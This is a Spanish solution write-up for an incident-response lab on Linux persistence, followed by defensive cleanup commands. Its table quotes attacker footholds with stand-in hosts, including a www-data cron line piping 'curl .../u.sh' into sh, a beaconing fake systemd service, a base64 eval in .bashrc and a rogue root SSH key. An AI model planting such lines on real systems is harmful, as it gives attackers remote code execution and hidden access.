# Solución — Inventario de persistencia

## Qué pasaba

| # | Persistencia | Detalle |
|---|---|---|
| 1 | servicio `systemd-netlinkd.service` | binario `/usr/lib/systemd/systemd-netlinkd`, beacon a `cdn-update.example.net` |
| 2 | crontab de `www-data` | `curl http://cdn-update.example.net/u.sh \| sh` cada 10 min |
| 3 | `/etc/cron.d/apt-compat-check` | ejecuta `/var/lib/apt/.cache/update` |
| 4 | `/home/deploy/.bashrc` | `eval` de un base64 que descarga una llave de `ssh-keys.example.net` |
| 5 | `/root/.ssh/authorized_keys` | llave `backup@infra` |

## Arreglo

```bash
nano ~/iocs.txt        # una línea por punto, con ruta y dominio
sudo mkdir -p /root/evidencia
sudo cp -a /etc/systemd/system/systemd-netlinkd.service /usr/lib/systemd/systemd-netlinkd \
  /etc/cron.d/apt-compat-check /var/lib/apt/.cache/update /root/evidencia/
sudo systemctl disable --now systemd-netlinkd.service
sudo rm -f /etc/systemd/system/systemd-netlinkd.service /usr/lib/systemd/systemd-netlinkd
sudo systemctl daemon-reload
sudo crontab -r -u www-data
sudo rm -f /etc/cron.d/apt-compat-check && sudo rm -rf /var/lib/apt/.cache
sudo sed -i '/# locale fix/d; /base64 -d/d' /home/deploy/.bashrc
sudo sed -i '/backup@infra/d' /root/.ssh/authorized_keys
bash /opt/lab/check.sh
```

## Más allá del lab

- Bloquea los dos dominios en DNS/proxy y búscalos en los logs de toda la red.
- Herramientas como `osquery` o Velociraptor sacan este inventario de toda la flota.
